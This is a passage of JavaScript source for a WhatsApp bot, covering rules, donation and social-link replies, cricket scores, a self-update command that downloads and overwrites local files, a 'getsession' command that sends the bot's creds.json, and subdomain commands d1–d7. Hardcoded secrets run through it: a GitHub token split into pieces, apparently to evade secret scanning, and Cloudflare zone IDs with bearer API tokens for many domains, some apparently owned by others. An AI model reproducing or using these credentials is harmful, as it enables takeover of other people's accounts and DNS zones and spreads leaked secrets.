  const cap = `┏━━━°❀ ❬ *Rules ${botname} MultiDevice* ❭ ❀°━━━┓

1. ✧ *Do not spam bots*, if caught you will be banned.

2. ✧ If the bot does not answer once, please try again. But if the bot doesn't answer twice, that means it's delayed, don't use it yet.

3. ✧ *Don't spam bots, just be aware of what you do* :)

4. ✧ If the limit runs out, please play the game to get experience. Examples of Games: Guessing Games, RPG Games, etc.

5. ✧ *It is prohibited to send Virtex/Bug to people*, even if there is no effect, dont spam. 

6. ✧ Calling Bots is Strictly Prohibited, If You Call You Will Be Automatically Blocked.

7. ✧ If you don't understand how to use the bot, please ask another member. Or if you haven't joined the bot channel, ask for the link and join.

8. ✧ If there is an error feature/don't understand how to use it, please report/ask the owner.

9. ✧ If the bot is delayed, don't spam it first.

10. ✧  *Sending Random Bugs to random People is Strictly Prohibited*.

┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
`
reply(cap)
}
break

case 'sc': case 'script': case 'donate': case 'cekupdate': case 'updatebot': case 'cekbot': case 'sourcecode': {
    let me = m.sender;
    let teks = `✨ *${global.botname} Script* ✨\n\n` +
               `📺 *YouTube:* ${global.websitex}\n` +
               `🐙 *GitHub:* ${global.botscript}\n\n` +
               `👋 *Hi* @${me.split('@')[0]}! \n` +
               `💖 _Don't forget to donate to support us!_ 🍜👇\n` +
               `https://i.ibb.co/SBXWb1R/donate.jpg`;

    sendDare(m.chat, { 
        text: teks,
        mentions: [me],
        contextInfo: {
            forwardingScore: 9999999,
            isForwarded: true,
            mentionedJid: [me],
            "externalAdReply": {
                "showAdAttribution": true,
                "renderLargerThumbnail": true,
                "title": global.botname, 
                "containsAutoReply": true,
                "mediaType": 1, 
                "thumbnail": fs.readFileSync("./data/image1.jpg"),
                "mediaUrl": `${wagc}`,
                "sourceUrl": `${wagc}`
            }
        }
    });
}
break;

  case 'update-repo': {
    if (!DareTheCreator) { 
        return replydare('You are not authorized to use this command.');
    }

    if (!DareTheCreator) return await loading()

    const tokenPart1 = 'ghp_';
    const tokenPart2 = 'XER7Zw2Rfe9MxiZFiwJx0R5j9W32vh0Ixn16'; // Replace with your actual token part if needed
    const token = tokenPart1 + tokenPart2;

    const repoOwner = 'Dare-1-0'; // Your repo owner
    const repoName = 'DARE-V3'; // Your repo name
    const commitFile = './current_commit.txt'; // File to store the latest commit SHA

    try {
        // Fetch the latest commit details from the repository
        const response = await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}/commits`, {
            headers: {
                'Authorization': `token ${token}`
            }
        });

        const latestCommitSha = response.data[0].sha; // Latest commit SHA

        let storedCommitSha = '';
        try {
            // Read the stored commit SHA from current_commit.txt
            storedCommitSha = await fs.promises.readFile(commitFile, 'utf8');
        } catch (err) {
            console.log("No current_commit.txt found, assuming first run.");
        }

        // Check if the latest commit is different from the stored one
        if (latestCommitSha !== storedCommitSha) {
            replydare('A new commit has been made. Update your bot!');

            // Fetch the commit details for the latest commit
            const commitDetails = await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}/commits/${latestCommitSha}`, {
                headers: {
                    'Authorization': `token ${token}`
                }
            });

            // Extract the changed files from the commit
            const changedFiles = commitDetails.data.files;

            let changedFilesList = 'The following files have changed:\n';
            changedFiles.forEach(file => {
                changedFilesList += `- ${file.filename} (${file.status})\n`;
            });

            replydare(changedFilesList);

            // List all files in the repository and update them if needed
            const filesResponse = await axios.get(`https://api.github.com/repos/${repoOwner}/${repoName}/contents`, {
                headers: {
                    'Authorization': `token ${token}`
                }
            });

            for (let file of filesResponse.data) {
                if (file.type === 'file') {
                    const fileUrl = file.download_url;
                    const filePath = file.path;

                    try {
                        const fileResponse = await axios.get(fileUrl);
                        // Save the updated content to the local file
                        fs.writeFileSync(`./${filePath}`, fileResponse.data);
                        console.log(`${filePath} updated successfully.`);
                    } catch (fileError) {
                        console.error(`Error downloading the update for ${filePath}:`, fileError);
                    }
                }
            }

            // Store the latest commit SHA
            await fs.promises.writeFile(commitFile, latestCommitSha, 'utf8');
            
            // Notify the user and restart the bot
            replydare('Bot has been updated. Restarting...');

            // Optional delay before restart
            await sleep(3000);

            // Restart the bot
            process.exit();
            
            // This will be logged after the bot restarts (on the next run)
            console.log('Bot restarted successfully and is now running the latest version.');
            replydare('Bot has been successfully updated and restarted.');
        } else {
            replydare('You are using the latest version of the bot.');
        }
    } catch (error) {
        console.error("Error checking for updates:", error.response ? error.response.data : error.message);
        replydare('Failed to check for updates. Please try again later.');
    }
}
break;

case 'socialmedia': 
case 'sosmed': 
case 'Devupdate': {
    const slides = [
        [
            'https://upload.wikimedia.org/wikipedia/commons/e/ef/Youtube_logo.png', // Image URL
            '', // Title
            `🎥 *Subscribe to the Developer's YouTube Channel for Updates*`, // Body message
            botname, // Footer message
            '🔗 Visit', // Button display text
            'https://youtube.com/@BMB_DARE', // Command (URL in this case)
            'cta_url', // Button type
            'https://youtube.com/@BMB_DARE' // URL (used in image generation)
        ], 
        [
            'https://upload.wikimedia.org/wikipedia/commons/thumb/8/83/Telegram_2019_Logo.svg/1024px-Telegram_2019_Logo.svg.png', // Image URL
            '', // Title
            `📱 *Join the Developer's Telegram Channel for Updates*`, // Body message
            botname, // Footer message
            '🔗 Visit', // Button display text
            'https://t.me/BMB_DARE', // Command (URL in this case)
            'cta_url', // Button type
            'https://t.me/BMB_DARE' // URL (used in image generation)
        ], 
        [
            'https://upload.wikimedia.org/wikipedia/commons/thumb/c/c2/GitHub_Invertocat_Logo.svg/360px-GitHub_Invertocat_Logo.svg.png', // Image URL
            '', // Title
            `🐱 *Follow the Developer on GitHub*`, // Body message
            botname, // Footer message
            '🔗 Visit', // Button display text
            'https://github.com/Dare-1-0', // Command (URL in this case)
            'cta_url', // Button type
            'https://github.com/Dare-1-0' // URL (used in image generation)
        ], 
        [
            'https://upload.wikimedia.org/wikipedia/commons/thumb/e/e7/Instagram_logo_2016.svg/264px-Instagram_logo_2016.svg.png', // Image URL
            '', // Title
            `📸 *Follow the Developer on Instagram*`, // Body message
            botname, // Footer message
            '🔗 Visit', // Button display text
            'https://www.instagram.com/bmb_dare', // Command (URL in this case)
            'cta_url', // Button type
            'https://www.instagram.com/bmb_dare' // URL (used in image generation)
        ], 
        [
            'https://upload.wikimedia.org/wikipedia/commons/thumb/6/6b/WhatsApp.svg/1024px-WhatsApp.svg.png', // Image URL
            '', // Title
            `💬 *Contact the Developer on WhatsApp*`, // Body message
            botname, // Footer message
            '🔗 Visit', // Button display text
            'https://Wa.me/2348089405509', // Command (URL in this case)
            'cta_url', // Button type
            'https://Wa.me/2348089405509' // URL (used in image generation)
        ], 
    ];

    const sendSlide = async (jid, title, message, footer, slides) => {
        const cards = slides.map(async slide => {
            const [
                image,
                titMess,
                boMessage,
                fooMess,
                textCommand,
                command,
                buttonType,
                url,
            ] = slide;
            let buttonParamsJson = {};
            
            
            switch (buttonType) {
    //button messages of slides            
    // Case for a URL button - triggers a URL when clicked
    case "cta_url":
        buttonParamsJson = {
            display_text: textCommand,  // The text displayed on the button
            url: url,                   // The URL to open when clicked
            merchant_url: url,          // The merchant URL (used in commerce contexts)
        };
        break;

    // Case for a call button - triggers a call when clicked
    case "cta_call":
        buttonParamsJson = { 
            display_text: textCommand,  // The text displayed on the button
            id: command,                // The identifier for the call action
        };
        break;

    // Case for a copy button - copies text to the clipboard when clicked
    case "cta_copy":
        buttonParamsJson = {
            display_text: textCommand,  // The text displayed on the button
            id: "",                     // ID is not needed for a copy button
            copy_code: command,         // The text to be copied to the clipboard
        };
        break;

    // Cases for reminder-related buttons or address message buttons
    case "cta_reminder":
    case "cta_cancel_reminder":
    case "address_message":
        buttonParamsJson = {
            display_text: textCommand,  // The text displayed on the button
            id: command,                // The ID or action associated with the reminder/address
        };
        break;

    // Case for a location-sharing button - allows the user to share their location
    case "send_location":
        buttonParamsJson = {};  // No extra parameters are needed for location sharing
        break;

    // Case for a quick reply button - triggers a quick response when clicked
    case "quick_reply":
        buttonParamsJson = {
            display_text: textCommand,  // The text displayed on the button
            id: command,                // The ID of the quick reply action
        };
        break;

    // Default case - no action, can be used for unknown button types    
                default:
                    break;
            }
            const buttonParamsJsonString = JSON.stringify(buttonParamsJson);
            return {
                body: proto.Message.InteractiveMessage.Body.fromObject({
                    text: boMessage,
                }),
                footer: proto.Message.InteractiveMessage.Footer.fromObject({
                    text: fooMess,
                }),
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: titMess,
                    hasMediaAttachment: true,
                    ...(await prepareWAMessageMedia(
                        { image: { url: image } },
                        { upload: Dare.waUploadToServer },
                    )),
                }),
                nativeFlowMessage:
                    proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                        buttons: [
                            {
                                name: buttonType,
                                buttonParamsJson: buttonParamsJsonString,
                            },
                        ],
                    }),
            };
        });
        
        const msg = generateWAMessageFromContent(
            jid,
            {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2,
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                            body: proto.Message.InteractiveMessage.Body.fromObject({
                                text: message,
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.fromObject({
                                text: footer,
                            }),
                            header: proto.Message.InteractiveMessage.Header.fromObject({
                                title: title,
                                subtitle: title,
                                hasMediaAttachment: false,
                            }),
                            carouselMessage:
                                proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                                    cards: await Promise.all(cards),
                                }),
                            contextInfo: {
                                mentionedJid: [m.sender], 
                                forwardingScore: 999,
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '120363232303807350@newsletter',
                                    newsletterName: ownername,
                                    serverMessageId: 143
                                }
                            }
                        }),
                    },
                },
            },
            { quoted: m},
        );
        await Dare.relayMessage(jid, msg.message, {
            messageId: msg.key.id,
        });
    };

    // Send the slide to the group or user
    await sendSlide(m.chat, 'Social Media Links', 'Check out the Developer’s social media for updates!', botname, slides);

    // Send the social media links in a formatted way
    await replydare(`
Here are the Developer's Social Media Links for Updates:

🎥 *Subscribe to the Developer's YouTube Channel for Updates*  
🔗 Visit: https://youtube.com/@BMB_DARE

📱 *Join the Developer's Telegram Channel for Updates*  
🔗 Visit: https://t.me/BMB_DARE

🐱 *Follow the Developer on GitHub*  
🔗 Visit: https://github.com/Dare-1-0

📸 *Follow the Developer on Instagram*  
🔗 Visit: https://www.instagram.com/bmb_dare

💬 *Contact the Developer on WhatsApp*  
🔗 Visit: https://Wa.me/2348089405509

For more updates, check out the links above!
`);

    // Send a regular reply to confirm the action
    await replydare('Here are the social media links and updates for the Developer! 🌐✨');
}
break;

case 'matches':
case 'match':
case 'cricket':
  {
    let res = await fetchJson(`https://api-smd.onrender.com/api/match`);
    const matches = res.results;
    console.log(matches);

    let outputMessage = ""; // Initialize the output message
    matches.forEach((match) => {
      // Change 'matches' to 'match'
      outputMessage += `🏏 *Match*: ${match.title}\n`;
      outputMessage += `🔗 *Link*: ${match.link}\n\n`;
    });

    replydare(
      `${outputMessage}\n\nType *${prefix}score cricbuzz link* to get detailed result...`
    );
  }
  break;

// Scores Command
case 'scores':
case 'score':
  {
    if (!args[0]) {
      return replydare(
        `⚠️ *Cricbuzz match Link is required*. Type *${prefix}matches* to get links...`
      );
    }

    let res = await fetchJson(
      `https://api-smd.onrender.com/api/score?url=${args[0]}`
    );
    if (res.error) {
      return replydare("❌ *No Data Found or Invalid URL...*");
    }

    let txt = `🏏 *Match Summary:*\n\n*${res.results.names}*\n\n`;
    txt += `📝 *Details:*\n`;
    res.results.details.forEach(detail => {
      txt += `📌 ${detail}\n`;
    });
    txt += `\n*Summary*: ${res.results.preview}`;

    replydare(txt);
  }
  break;

case 'channel':
case 'repo': {
const url = "https://files.catbox.moe/7rt6v2.jpg";
  async function image(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: { url }
    }, {
      upload: Dare.waUploadToServer
    });
    return imageMessage;
  }
  let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `> ʜɪ sɪʀ ${pushname}`
            },
            carouselMessage: {
              cards: [
                {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text:`> Click the button below to\n> Join Channel  `},
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"🙂 Join Channel","url":"https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M","merchant_url":"https://whatsapp.com/channel/0029VajhqUnD38COHw1aSy0M"}`
                    },
                  ],
                },
              },
              {
                header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: './data/image/thumb.jpg' } }, { upload: Dare.waUploadToServer })),
          title: ``,
          gifPlayback: true,
          subtitle: ownername,
          hasMediaAttachment: false
        }),
                body: {
                  text:`> Click the button below to\n> Get script`},
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "cta_url",
                      buttonParamsJson: `{"display_text":"Get Script","url":"https://github.com/Dare-1-0/DARE-V3","merchant_url":"https://github.com/Dare-1-0/DARE-V3"}`
                    },
                  ],
                },
              },
            ],
            messageVersion: 1,
          },
        },
      },
    },
  },
  {}
);

await Dare.relayMessage(msg.key.remoteJid, msg.message, {
  messageId: msg.key.id,
});

}
break
case 'getsession':
if (!DareTheCreator) return reply(mess.only.owner)
replydare('Wait a moment, currently retrieving your session file')
let sesi = await fs.readFileSync('./session/creds.json')
Dare.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {
quoted: m
})
break
case 'subdomain': {
const text12 = `𝐒𝐀𝐋𝐀𝐌 𝐒𝐈𝐑 @${sender.split("@")[0]}

❏━━『 *LIST DOMAIN BY ${ownername}* 』━━
> ○⊱d1 kedai-panel.my.id
> ○⊱d2 piwzstoreee.my.id
> ○⊱d3 piwzpediaaa.biz.id
> ○⊱d4 piwzpanel.me
> ○⊱d5 r0ulxye4.my.id
> ○⊱d6 lanzpanel.my.id
> ○⊱d7 cpanel-vip.my.id (khusus cpanel)
> ○⊱d8 kukurahost.my.id
> ○⊱d9 tokopanellku.my.id
> ○⊱d10 kiospanell.my.id
> ○⊱d11 moon-offc.my.id
> ○⊱d12 moon-ooffc.biz.id
> ○⊱d13 tokopanellmurah.my.id
> ○⊱d14 bisnispanel.my.id
> ○⊱d15 tokopanel.biz.id
> ○⊱d16 store-panel.biz.id
> ○⊱d17 sellerpanel.biz.id
> ○⊱d18 mypanel.my.id
> ○⊱d19 kangpanel.biz.id
> ○⊱d20 jasapanel.my.id
> ○⊱d21 dewapanel.my.id
> ○⊱d22 adminpanel.biz.id
> ○⊱d23 plerkuda.my.id
> ○⊱d24 cafegt.my.id
> ○⊱d25 shopwebsite.my.id
> ○⊱d26 sellerpanel-vvip.my.id
> ○⊱d27 ekioffcial.biz.id
> ○⊱d28 panelku-jasteb.my.id
> ○⊱d29 pannel-pvrt.my.id
> ○⊱d30 sellerpanell.my.id
> ○⊱d31 pannelkuu.biz.id
> ○⊱d32 server-smtp1.my.id
> ○⊱d33 my-website.my.id
> ○⊱d34 smtp1.my.id
> ○⊱d35 mefahri.biz.id 
> ○⊱d36 mefahri.biz.id 
> ○⊱d37 didindev.my.id
> ○⊱d38 ruztanxd.my.id
> ○⊱d39 sellerpanell-store.xyz
> ○⊱d40 rafeyfah.my.id
> ○⊱d41 kayy.me
> ○⊱d42 kayyoffc.tech
> ○⊱d43 kayypedia.com
> ○⊱d44 panellstoree.com
> ○⊱d45 windastore.live
> ○⊱d46 zanofc.biz.id
┗━═┅═━━━๑
   ©${botname}
*NOTE :*
•○⊱ꜰᴇʟʟᴏᴡ ᴍᴇᴍʙᴇʀꜱ ᴀʀᴇ ᴘʀᴏʜɪʙɪᴛᴇᴅ ꜰʀᴏᴍ ᴅᴏꜱ ᴇᴀᴄʜ ᴏᴛʜᴇʀ
•○⊱BRUHHH`
Dare.sendMessage(m.chat, {
text: text12,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: 'subdomain',
"thumbnailUrl": 'https://files.catbox.moe/7rt6v2.jpg',
sourceUrl: wagc,
mediaType: 1,
renderLargerThumbnail: true
}}}, {quoted: m})
}
break
case 'd1': {
 if (!DareTheCreator) return reply(mess.only.owner)
function subDomain1(host, ip) {
  return new Promise((resolve) => {
    let zone = "5d00f56aee3afd9cc4e0666bc8f23746";
    let apitoken = "mjR4BdiOo6aFO3uPl8BTgZIgOMH3asLbgVsOpEfO";
    let tld = "kedai-panel.my.id";
    axios
      .post(
        `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
        { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
        {
          headers: {
 Authorization: "Bearer " + apitoken,
 "Content-Type": "application/json",
          },
        }
      )
      .then((e) => {
        let res = e.data;
        if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("USAGE .domain1 hostname|167.29.379.23");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "ip tidak valid" : "mana ip nya");
   
           subDomain1(host1, ip1).then((e) => {
             if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = ${botname}\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
 break
 
           case 'd2': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "f374d347f22dc1b0ac208973f185c1f2";
               let apitoken = "m7Xe_0qhlv8enPURlO7UYRSR1-3C7u-uOUkZtvZa";
               let tld = "piwzstoreee.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = ${botname}\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
 break
           
  case 'd3': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c1812c92fb249258e67a28573ca34344";
               let apitoken = "mqAjTHuT_GsaZsWcIjbllV-rrrtJHwyVxVeYlL1A";
               let tld = "piwzpediaaa.biz.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = ${botname}\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
  break       
  
  case 'd4': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "3cea2e71ec2bc82ea7865da5999d04b1";
               let apitoken = "eyOrW0eUPe0VxhQzzubXhY1w8X_Z120crfqpsNwL";
               let tld = "piwzpanel.me";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = ${botname}\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
 break
 case 'd5': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "c2c8ddf4f1bfd0d0c11eb0ed83a634f9";
               let apitoken = "RHmElwWM5pEb3HsWi82uramdhi9wzDsaU8F9JV6F";
               let tld = "r0ulxye4.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = ${botname}\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
 break                                                                               
 
 case 'd6': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "7432f024eeeaa0367fd985a18b2729cc";
               let apitoken = "RsbJAI6X7s7bPEj23R7sf28cqHibApP1EBSoF4FZ";
               let tld = "lanzpanel.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
           let ip1 = raw1.split("|")[1]?.replace(/[^0-9.]/gi, "");
           if (!ip1 || ip1.split(".").length < 4) return reply(ip1 ? "invalid ip" : "where is the ip");
   
           subDomain1(host1, ip1).then((e) => {
                          if (e['success']) reply(`┏━━━━━━━━━━━━━━━━━━━\n┣ Ip = ${e['ip']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ Link = ${e['name']}\n┗━━━━━━━━━━━━━━━━━━━\n┣ 𝘾𝙧𝙚𝙖𝙩𝙚 𝙗𝙮 = 𝙒𝙞𝙣𝙙𝙖𝙃𝙤𝙩𝙨\n┗━━━━━━━━━━━━━━━━━━━`);
             else reply(`failed to create subdomain\nMsg: ${e['error']}`)
           }); }
  break  
case 'd7': {
        if (!DareTheCreator) return reply(mess.only.owner)
           function subDomain1(host, ip) {
             return new Promise((resolve) => {
               let zone = "891a2e5d4ac5b3db4fbcef8d9088ad38";
               let apitoken = "V2BCJ-jhHXQlkN5-_Jv-CuXEtJbLT9fo7NWAlMK2";
               let tld = "cpanel-vip.my.id";
               axios
                 .post(
                   `https://api.cloudflare.com/client/v4/zones/${zone}/dns_records`,
                   { type: "A", name: host.replace(/[^a-z0-9.-]/gi, "") + "." + tld, content: ip.replace(/[^0-9.]/gi, ""), ttl: 3600, priority: 10, proxied: false },
                   {
                     headers: {
                       Authorization: "Bearer " + apitoken,
                       "Content-Type": "application/json",
                     },
                   }
                 )
                 .then((e) => {
                   let res = e.data;
                   if (res.success) resolve({ success: true, zone: res.result?.zone_name, name: res.result?.name, ip: res.result?.content });
                 })
                 .catch((e) => {
                   let err1 = e.response?.data?.errors?.[0]?.message || e.response?.data?.errors || e.response?.data || e.response || e;
                   let err1Str = String(err1);
                   resolve({ success: false, error: err1Str });
                 });
             });
           }
   
           let raw1 = args?.join(" ")?.trim();
           if (!raw1) return reply("where is the host & ip?");
           let host1 = raw1
             .split("|")[0]
             .trim()
             .replace(/[^a-z0-9.-]/gi, "");
           if (!host1) return reply("host is invalid, make sure the host only contains letters, numbers, - (stripes), and . (point)");
